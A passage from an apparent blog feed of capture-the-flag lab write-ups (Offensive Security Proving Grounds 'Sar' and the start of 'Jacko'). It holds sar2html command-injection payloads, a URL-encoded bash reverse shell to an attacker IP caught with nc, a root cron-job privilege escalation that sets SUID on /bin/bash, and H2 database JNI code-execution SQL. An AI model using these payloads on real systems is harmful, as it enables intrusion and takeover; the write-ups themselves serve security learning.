index.html              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376]
phpinfo.php             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 95515, Words: 4725, Lines: 1170]
robots.txt              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 9, Words: 1, Lines: 2]
server-status           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 279, Words: 20, Lines: 10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Lets us navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/robots.txt&lt;/code&gt; directory we’ve obtained previously.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.123.35/robots.txt | html2text
sar2HTML
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; yields &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar2HTML&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Opening &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar2HTML&lt;/code&gt;, we are redirected to a new directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.123.35/sar2HTML/index.php | html2text


                              sar2html Ver 3.2.1
                             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Donate &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you like!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; New
    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; OS
          o HP-UX
          o Linux
          o SunOS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;→ The target system is running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar2html&lt;/code&gt; version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3.2.1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After conducting a few investigations, we discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3.2.1&lt;/code&gt; is a vulnerable version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar2html&lt;/code&gt;, which could lead to Remote Code Execution (RCE).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit sar2html                
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                              |  Path
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
sar2html 3.2.1 - &lt;span class=&quot;s1&quot;&gt;&apos;plot&apos;&lt;/span&gt; Remote Code Execution                                                                                                               | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                   | php/webapps/47204.txt
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;sar2html-plot-vulnerability&quot;&gt;Sar2HTML &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plot&lt;/code&gt; Vulnerability&lt;/h4&gt;

&lt;p&gt;By exploiting the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plot&lt;/code&gt; param, we easily achieve code execution.&lt;/p&gt;

&lt;p&gt;There are two ways of achieving code execution.&lt;/p&gt;

&lt;p&gt;[1.] Manual with the following payload:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.123.35/sar2HTML/index.php?plot=&lt;span class=&quot;nt&quot;&gt;&amp;lt;OS&amp;gt;&lt;/span&gt;;&lt;span class=&quot;nt&quot;&gt;&amp;lt;command-here&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 192.168.123.35/sar2HTML/index.php?plot&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LINUX%3Bwhoami | html2text

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]

..&amp;gt;There is no defined host...
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[2.] Using the public &lt;a href=&quot;https://www.exploit-db.com/exploits/49344&quot;&gt;exploit script.&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49344.py                                               
Enter The url &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; http://192.168.123.35/sar2HTML/       
Command &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;www-data

Command &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s always a good idea to URL-encode the reverse shell before sending it. Our final payload is:&lt;/p&gt;
&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.123%2F80+0%3E%261%22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If everything works properly, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80                                                                                                                                                                           1 ⨯
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.123] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.123.35] 43594
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;981&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;crontab&quot;&gt;&lt;strong&gt;Crontab&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;There is a cronjob running on the target system by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab

...
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/5  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/html/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; ./finally.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;→ Every 5 minutes, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; will navigate to the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./finally.sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us inspect the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./finally.sh&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/www/html/./finally.sh
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/www/html/./finally.sh

&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;

./write.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./finally.sh&lt;/code&gt; will then execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./write.sh&lt;/code&gt;, which is under our control.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/www/html/write.sh    
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/www/html/write.sh
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 www-data www-data 30 Jul 24  2020 /var/www/html/write.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Essentially, we can just craft a payload and write it into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/write.sh&lt;/code&gt;, then wait for 5 minutes, our payload should be executed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The payload might look like follow:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/www/html/write.sh
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +s /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After 5 minutes, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; should be dressed with a SUID bit.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /bin/bash
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 1113504 Jun  7  2019 /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This also means we are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; on the system!.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@sar:/var/www/html/sar2HTML&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="pg" /><category term="ctf" /><category term="linux" /><summary type="html">Summary Of Result The machine is compromised by exploiting the vulnerable version of sar2html. Once we’ve obtained the initial access, we can then escalate our privilege via a root ‘s crontab that executes a custom .sh of our control.</summary></entry><entry><title type="html">Jacko - OSPG</title><link href="https://jayngng.github.io/blog/jacko-ospg/" rel="alternate" type="text/html" title="Jacko - OSPG" /><published>2021-08-17T09:38:44+10:00</published><updated>2021-08-17T09:38:44+10:00</updated><id>https://jayngng.github.io/blog/jacko---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/jacko-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary Of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;As enumerating, we discover a vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2 database&lt;/code&gt; with a default credentials running on the target system, which leads to Remote Code Execution. We can then escalate our privilege by abusing misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt; token.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;The attack is summed up within three stages:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration.&lt;/li&gt;
  &lt;li&gt;Exploitation.&lt;/li&gt;
  &lt;li&gt;Administrative Privilege Escalation.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We will start with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:                                                                                
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0      
|_http-title: H2 Database Engine &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;redirect&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
7680/tcp open  tcpwrapped    syn-ack ttl 127
8082/tcp open  http          syn-ack ttl 127 H2 database http console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods:             
|_  Supported Methods: GET POST
|_http-title: H2 Console  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;There are a few ports running on the target machine. However, the HTTP service on port 8082 really draws our attention.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;h2-database---port-8082&quot;&gt;&lt;strong&gt;H2 Database&lt;/strong&gt; &lt;strong&gt;- Port 8082&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigate to the website, we are redirected to a login page.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.60.66:8082/login.jsp?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;67d97f9e84ff28caa571dba2a900edb3 | html2text                                                                                   1 ⚙


&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;One of: Čeština/Deutsch/English/Español/Français/Magyar/한국어/Indonesia/
Italiano/日本語/Nederlands/Polski/Português &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Brasil&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/Português &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Europeu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/русский/
Slovensky/Türkçe/Українська/中文 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;简体&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/中文 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;繁體&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;    Preferences     Tools    Help
Login
                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;One of: Generic H2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Embedded&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/Generic H2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/Generic
                Derby &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Embedded&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/Generic Derby &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/Generic HSQLDB/Generic
                MySQL/Generic PostgreSQL/Generic MS SQL Server 2005/Generic MS
Saved Settings: SQL Server 2000/Generic Oracle/Generic DB2/Generic SQLite/
                Generic Firebird Server/Generic Azure SQL/Generic Hive/Generic
                Hive 2/Generic Impala/Generic Redshift/Generic Snowflake/
                Generic Teradata/Generic JNDI Data Source]
Setting Name:   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Generic H2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Embedded&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unknown INPUT &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unknown INPUT
                &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==============================================================================&lt;/span&gt;
Driver Class:   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;org.h2.Driver       &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
JDBC_URL:       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;jdbc:h2:~/test      &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
User Name:      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;sa                  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
Password:       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Connect]   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unknown INPUT &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Testing some weak credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:root&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt;, but none of them really works out.&lt;/p&gt;

&lt;p&gt;After a few researches, we discover that the web application using default credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sar:(no password)&lt;/code&gt;, which allows us to completely bypass the login portal, and logged in as web &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/jacko/version.png&quot; title=&quot;jacko/version.png&quot; alt=&quot;jacko/version.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;More importantly, we also notice that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2 database&lt;/code&gt; version is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.4.199&lt;/code&gt;, which expose a critical vulnerability that ends up Remote Code Execution.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit H2 1.4.199
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                                                   |  Path
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
H2 Database 1.4.199 - JNI Code Execution                                                                                                                                         | java/local/49384.txt
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;h2-database-exploitation&quot;&gt;&lt;strong&gt;H2 Database Exploitation&lt;/strong&gt;&lt;/h4&gt;
&lt;ol&gt;
  &lt;li&gt;Following along the &lt;a href=&quot;https://www.exploit-db.com/exploits/49384&quot;&gt;public exploit&lt;/a&gt;, we first use SQL syntax to create a DLL payload.
    &lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT CSVWRITE(&apos;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;NIScriptEngine.dll&apos;, CONCAT(&apos;SELECT NULL &quot;&apos;
[...]
&apos;ISO-8859-1&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Next, we will load the DLL payload.
    &lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS IF NOT EXISTS System_load FOR &quot;java.lang.System.load&quot;;
CALL System_load(&apos;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;NIScriptEngine.dll&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Then, we craft a reverse shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;.
